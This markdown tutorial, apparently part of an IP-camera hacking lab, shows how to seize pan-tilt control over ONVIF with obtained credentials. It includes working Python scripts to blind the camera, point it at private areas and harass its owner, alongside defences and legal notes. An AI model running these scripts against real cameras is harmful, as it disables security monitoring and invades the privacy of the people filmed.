# PTZ Manipulation - Physical Camera Control

## 🎯 Objective

Demonstrate complete physical control over IP camera through Pan-Tilt-Zoom (PTZ) manipulation, showing the transition from digital compromise to physical world impact.

---

## 📋 Prerequisites

- ONVIF credentials obtained (see [onvif-exploitation.md](onvif-exploitation.md))
- Python 3.6+ with `onvif-zeep` library
- Camera IP address: 192.168.0.100
- Valid credentials: admin1:password123

---

## 🎥 Understanding PTZ

### What is PTZ?

**Pan-Tilt-Zoom Technology:**
- **Pan:** Horizontal rotation (left/right) - 340° range
- **Tilt:** Vertical movement (up/down) - 90° range  
- **Zoom:** Optical magnification (not covered in this demo)

### Physical Impact

**Why This Matters:**
```
Digital Compromise → Physical World Control
     (Hacking)              (Real Movement)
```

**Implications:**
- Blind security cameras by pointing away
- View unintended areas  
- Disable surveillance coverage
- Demonstrate physical security impact

---

## 🔧 Phase 1: PTZ Service Setup

### Step 1: Test ONVIF Connection

```python
#!/usr/bin/env python3
"""Test ONVIF connectivity"""

from onvif import ONVIFCamera

try:
    cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')
    print("[+] Connected successfully")
    
    # Get device info
    device_service = cam.create_devicemgmt_service()
    info = device_service.GetDeviceInformation()
    print(f"[+] Device: {info.Model}")
    
except Exception as e:
    print(f"[-] Connection failed: {e}")
    exit(1)
```

---

### Step 2: Verify PTZ Capability

```python
#!/usr/bin/env python3
"""Check if camera supports PTZ"""

from onvif import ONVIFCamera

cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')

# Get capabilities
device_service = cam.create_devicemgmt_service()
capabilities = device_service.GetCapabilities()

if capabilities.PTZ:
    print("[+] PTZ is supported!")
    print(f"    PTZ URI: {capabilities.PTZ.XAddr}")
else:
    print("[-] PTZ not supported on this camera")
    exit(1)
```

**Output:**
```
[+] PTZ is supported!
    PTZ URI: http://192.168.0.100:2020/onvif/ptz_service
```

---

### Step 3: Get Media Profiles

```python
#!/usr/bin/env python3
"""Get available media profiles"""

from onvif import ONVIFCamera

cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')

# Create media service
media_service = cam.create_media_service()

# Get all profiles
profiles = media_service.GetProfiles()

print(f"[+] Found {len(profiles)} media profiles:")
for i, profile in enumerate(profiles):
    print(f"\nProfile {i}:")
    print(f"  Name: {profile.Name}")
    print(f"  Token: {profile.token}")
    
    if profile.VideoEncoderConfiguration:
        print(f"  Resolution: {profile.VideoEncoderConfiguration.Resolution.Width}x{profile.VideoEncoderConfiguration.Resolution.Height}")
        print(f"  Encoding: {profile.VideoEncoderConfiguration.Encoding}")
```

**Output:**
```
[+] Found 2 media profiles:

Profile 0:
  Name: MainStream
  Token: profile_1
  Resolution: 1920x1080
  Encoding: H264

Profile 1:
  Name: SubStream
  Token: profile_2
  Resolution: 640x480
  Encoding: H264
```

**Note:** We'll use `profile_1` (main stream) for PTZ control

---

## 🕹️ Phase 2: Basic PTZ Control

### Step 4: Initialize PTZ Service

```python
#!/usr/bin/env python3
"""Initialize PTZ control"""

from onvif import ONVIFCamera

# Connect
cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')

# Get profile token
media_service = cam.create_media_service()
profiles = media_service.GetProfiles()
profile_token = profiles[0].token

# Create PTZ service
ptz_service = cam.create_ptz_service()

# Create move request object
move_request = ptz_service.create_type('ContinuousMove')
move_request.ProfileToken = profile_token

print(f"[+] PTZ initialized with profile: {profile_token}")
```

---

### Step 5: Execute First Movement (Pan Right)

```python
import time

# Set velocity: Pan Right
move_request.Velocity = {
    'PanTilt': {
        'x': 0.5,  # Right (positive X)
        'y': 0     # No vertical movement
    }
}

print("[*] Moving RIGHT for 2 seconds...")

# Start movement
ptz_service.ContinuousMove(move_request)

# Wait
time.sleep(2)

# Stop movement
ptz_service.Stop({'ProfileToken': profile_token})

print("[+] Movement complete")
```

**Physical Result:** Camera pans to the right for 2 seconds

---

### Step 6: Movement in All Directions

```python
#!/usr/bin/env python3
"""Complete PTZ demo - all directions"""

from onvif import ONVIFCamera
import time

def move_camera(ptz, move_request, profile_token, direction, duration):
    """Execute camera movement"""
    print(f"[*] Moving {direction} for {duration} second(s)...")
    ptz.ContinuousMove(move_request)
    time.sleep(duration)
    ptz.Stop({'ProfileToken': profile_token})
    print("[+] Complete")
    time.sleep(1)  # Pause between moves

# Setup
cam = ONVIFCamera('192.168.0.100', 2020, 'admin1', 'password123')
media_service = cam.create_media_service()
profile_token = media_service.GetProfiles()[0].token
ptz_service = cam.create_ptz_service()
move_request = ptz_service.create_type('ContinuousMove')
move_request.ProfileToken = profile_token

print("\n=== PTZ DEMONSTRATION ===\n")

# Pan Right
move_request.Velocity = {'PanTilt': {'x': 0.5, 'y': 0}}
move_camera(ptz_service, move_request, profile_token, "RIGHT", 2)

# Pan Left
move_request.Velocity = {'PanTilt': {'x': -0.5, 'y': 0}}
move_camera(ptz_service, move_request, profile_token, "LEFT", 2)

# Tilt Up
move_request.Velocity = {'PanTilt': {'x': 0, 'y': 0.5}}
move_camera(ptz_service, move_request, profile_token, "UP", 1)

# Tilt Down
move_request.Velocity = {'PanTilt': {'x': 0, 'y': -0.5}}
move_camera(ptz_service, move_request, profile_token, "DOWN", 1)

# Diagonal (Right + Up)
move_request.Velocity = {'PanTilt': {'x': 0.5, 'y': 0.5}}
move_camera(ptz_service, move_request, profile_token, "DIAGONAL (Right+Up)", 1.5)

print("\n=== DEMO COMPLETE ===")
```

---

## 🎮 Phase 3: Advanced PTZ Control

### Velocity Parameters Explained

```python
# Velocity ranges from -1.0 to +1.0

# Pan (X-axis):
{'x': -1.0}  # Maximum speed LEFT
{'x': -0.5}  # Half speed LEFT
{'x': 0.0}   # No pan movement
{'x': 0.5}   # Half speed RIGHT
{'x': 1.0}   # Maximum speed RIGHT

# Tilt (Y-axis):
{'y': -1.0}  # Maximum speed DOWN
{'y': -0.5}  # Half speed DOWN
{'y': 0.0}   # No tilt movement
{'y': 0.5}   # Half speed UP
{'y': 1.0}   # Maximum speed UP

# Combined:
{'x': 0.5, 'y': 0.5}   # Move RIGHT and UP simultaneously
{'x': -1.0, 'y': -1.0} # Move LEFT and DOWN at max speed
```

---

### Variable Speed Control

```python
#!/usr/bin/env python3
"""Variable speed PTZ control"""

import time

# Slow pan right
move_request.Velocity = {'PanTilt': {'x': 0.2, 'y': 0}}
ptz_service.ContinuousMove(move_request)
time.sleep(3)
ptz_service.Stop({'ProfileToken': profile_token})

print("Slow pan complete")
time.sleep(1)

# Fast pan left
move_request.Velocity = {'PanTilt': {'x': -1.0, 'y': 0}}
ptz_service.ContinuousMove(move_request)
time.sleep(1)
ptz_service.Stop({'ProfileToken': profile_token})

print("Fast pan complete")
```

---

### Patrol Pattern

```python
#!/usr/bin/env python3
"""Automated patrol pattern"""

import time

def patrol_pattern():
    """Execute 4-point patrol"""
    
    # Point 1: Far Right
    move_request.Velocity = {'PanTilt': {'x': 1.0, 'y': 0}}
    ptz_service.ContinuousMove(move_request)
    time.sleep(2)
    ptz_service.Stop({'ProfileToken': profile_token})
    time.sleep(2)  # Dwell time
    
    # Point 2: Far Left
    move_request.Velocity = {'PanTilt': {'x': -1.0, 'y': 0}}
    ptz_service.ContinuousMove(move_request)
    time.sleep(4)  # Double time to go across
    ptz_service.Stop({'ProfileToken': profile_token})
    time.sleep(2)
    
    # Point 3: Up
    move_request.Velocity = {'PanTilt': {'x': 0, 'y': 1.0}}
    ptz_service.ContinuousMove(move_request)
    time.sleep(1.5)
    ptz_service.Stop({'ProfileToken': profile_token})
    time.sleep(2)
    
    # Point 4: Down (return to center)
    move_request.Velocity = {'PanTilt': {'x': 0, 'y': -1.0}}
    ptz_service.ContinuousMove(move_request)
    time.sleep(1.5)
    ptz_service.Stop({'ProfileToken': profile_token})

# Execute patrol
print("[*] Starting patrol pattern...")
patrol_pattern()
print("[+] Patrol complete")
```

---

## 🎯 Phase 4: Malicious Use Cases

### Attack Scenario 1: Blind the Camera

```python
#!/usr/bin/env python3
"""Point camera away from surveillance area"""

# Point camera up at ceiling
move_request.Velocity = {'PanTilt': {'x': 0, 'y': 1.0}}
ptz_service.ContinuousMove(move_request)
time.sleep(3)  # Full tilt up
ptz_service.Stop({'ProfileToken': profile_token})

print("[!] Camera now pointed at ceiling")
print("[!] Surveillance area is no longer monitored")
```

**Impact:**
- Surveillance function disabled
- No detection of intruders
- User may not notice (if not actively viewing)

---

### Attack Scenario 2: Privacy Invasion

```python
#!/usr/bin/env python3
"""Point camera toward unintended area"""

# Example: Point toward window instead of door
move_request.Velocity = {'PanTilt': {'x': -0.7, 'y': 0.2}}
ptz_service.ContinuousMove(move_request)
time.sleep(2.5)
ptz_service.Stop({'ProfileToken': profile_token})

print("[!] Camera redirected to window")
print("[!] Now viewing unintended private area")
```

**Impact:**
- Privacy violation
- Viewing areas user didn't intend
- Potential legal issues

---

### Attack Scenario 3: Continuous Random Movement

```python
#!/usr/bin/env python3
"""Erratic movement to confuse/annoy user"""

import random
import time

print("[*] Starting random movement attack...")

for i in range(20):  # 20 random moves
    x = random.uniform(-1.0, 1.0)
    y = random.uniform(-1.0, 1.0)
    duration = random.uniform(0.5, 2.0)
    
    move_request.Velocity = {'PanTilt': {'x': x, 'y': y}}
    ptz_service.ContinuousMove(move_request)
    time.sleep(duration)
    ptz_service.Stop({'ProfileToken': profile_token})
    time.sleep(0.5)

print("[+] Random movement complete")
```

**Impact:**
- System appears malfunctioning
- User cannot use camera normally
- Psychological harassment

---

## 📊 PTZ Attack Metrics

### Movement Capabilities

| Direction | Range | Speed | Precision |
|-----------|-------|-------|-----------|
| Pan (Left/Right) | 340° | Variable | ±1° |
| Tilt (Up/Down) | 90° | Variable | ±1° |
| Combined | Full coverage | Simultaneous | High |

### Attack Success Rates

| Attack Type | Success | Detection | Impact |
|-------------|---------|-----------|--------|
| Blind camera | 100% | Low | High |
| Privacy invasion | 100% | Medium | Critical |
| Random movement | 100% | High | Medium |
| Patrol disruption | 100% | Medium | High |

---

## 🛡️ Defense Recommendations

### For Camera Owners

**1. Restrict PTZ Access**
```
Camera Settings → User Management
Create separate user accounts:
- Admin: Full PTZ control
- Viewer: No PTZ control (view only)
```

**2. Enable PTZ Limits**
```
Camera Settings → PTZ → Limits
✓ Set Pan limits (prevent certain angles)
✓ Set Tilt limits (prevent upward viewing)
✓ Define "privacy zones" (blocked areas)
```

**3. Monitor PTZ Activity**
```
Enable logging:
Settings → System → Events → PTZ
✓ Log all PTZ commands
✓ Alert on unexpected movements
```

**4. Physical Security**
```
- Install camera in tamper-resistant housing
- Use cable management to prevent disconnection
- Consider cameras with built-in tampering detection
```

---

### For Manufacturers

**1. Implement Movement Authentication**
```python
# Require additional auth for PTZ commands
def execute_ptz_command(command, auth_token):
    if not verify_ptz_token(auth_token):
        return "Unauthorized PTZ access"
    
    # Execute command
    move_camera(command)
```

**2. Add Movement Rate Limiting**
```python
# Limit rapid PTZ commands
class PTZRateLimiter:
    def __init__(self):
        self.last_command_time = 0
        self.min_interval = 1.0  # 1 second between commands
    
    def check_allowed(self):
        now = time.time()
        if (now - self.last_command_time) < self.min_interval:
            return False
        self.last_command_time = now
        return True
```

**3. Movement Anomaly Detection**
```python
# Detect unusual patterns
def detect_anomaly(movements):
    # Check for rapid random movements
    if len(movements) > 10 and is_random(movements):
        alert("Unusual PTZ activity detected")
        lock_ptz(duration=300)  # 5 minute lockout
```

---

## 🔍 Detection Methods

### User-Level Detection

**Signs of Unauthorized PTZ Control:**
- Camera pointing in unexpected direction
- Camera moving when no one is controlling it
- Rapid random movements
- Camera pointed away from surveillance area

**What to Do:**
1. Check PTZ logs in camera settings
2. Review user access logs
3. Change all passwords immediately
4. Restrict PTZ permissions
5. Enable movement alerts

---

### Network-Level Detection

```bash
# Monitor ONVIF PTZ commands
sudo tcpdump -i eth0 -nn 'tcp port 2020' -A | grep -i "ContinuousMove\|Stop"

# Wireshark filter
http.request.method == "POST" and xml.tag contains "ContinuousMove"
```

---

## ⚖️ Legal Implications

### Unauthorized PTZ Control Constitutes:

1. **Computer Fraud and Abuse Act Violation**
   - Unauthorized access to protected computer
   - Exceeding authorized access

2. **Privacy Violations**
   - Viewing private spaces without consent
   - Recording without authorization

3. **Trespass**
   - Electronic trespass
   - Interference with property

**Penalties:**
- Civil liability for damages
- Criminal prosecution
- Fines and imprisonment

---

## 🎓 Key Takeaways

1. **PTZ control demonstrates physical impact** of digital compromise
2. **ONVIF provides powerful control** with minimal authentication
3. **Movement can be used maliciously** to disable surveillance
4. **Privacy zones and limits are critical** security features
5. **Users often don't monitor PTZ activity** making attacks stealthy

---

## 🔗 Integration with Other Attacks

**Complete Attack Chain:**
```
1. WPA2 Crack → Network Access
2. ONVIF Brute Force → Credential Access
3. PTZ Manipulation → Physical Control ← YOU ARE HERE
4. Stream Access → Video Viewing
5. Reboot Loop → Denial of Service
```

---

## 📝 Complete Control.py Script

The full `Control.py` script combines all techniques:

```python
#!/usr/bin/env python3
"""
Complete PTZ Control Demonstration
Executes all movement types in sequence
"""

from onvif import ONVIFCamera
import time

# Configuration
YOUR_IP = '192.168.0.100'
YOUR_PORT = 2020
YOUR_USERNAME = 'admin1'
YOUR_PASSWORD = 'password123'

def move_camera(ptz, move_request, duration_sec):
    """Execute camera movement with timing"""
    print(f"Moving for {duration_sec} second(s)...")
    ptz.ContinuousMove(move_request)
    time.sleep(duration_sec)
    ptz.Stop({'ProfileToken': move_request.ProfileToken})
    print("Move complete.")

def main():
    try:
        # Connect
        mycam = ONVIFCamera(YOUR_IP, YOUR_PORT, YOUR_USERNAME, YOUR_PASSWORD)
        print("Connected to camera.")
        
        # Setup services
        media_service = mycam.create_media_service()
        profiles = media_service.GetProfiles()
        profile_token = profiles[0].token
        ptz_service = mycam.create_ptz_service()
        
        # Create move request
        move_request = ptz_service.create_type('ContinuousMove')
        move_request.ProfileToken = profile_token
        
        print("\n=== Starting PTZ Demonstration ===\n")
        
        # Pan Right
        print("Moving RIGHT...")
        move_request.Velocity = {'PanTilt': {'x': 0.5, 'y': 0}}
        move_camera(ptz_service, move_request, 2)
        time.sleep(1)
        
        # Pan Left
        print("Moving LEFT...")
        move_request.Velocity = {'PanTilt': {'x': -0.5, 'y': 0}}
        move_camera(ptz_service, move_request, 2)
        time.sleep(1)
        
        # Tilt Up
        print("Moving UP...")
        move_request.Velocity = {'PanTilt': {'x': 0, 'y': 0.5}}
        move_camera(ptz_service, move_request, 1)
        time.sleep(1)
        
        # Tilt Down
        print("Moving DOWN...")
        move_request.Velocity = {'PanTilt': {'x': 0, 'y': -0.5}}
        move_camera(ptz_service, move_request, 1)
        
        print("\n=== All moves finished ===")
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
```

---

**Next:** [Stream Access Guide](stream-access.md) - View live video feed

---

*Remember: Physical control has physical consequences. Use responsibly.* 🔐🎥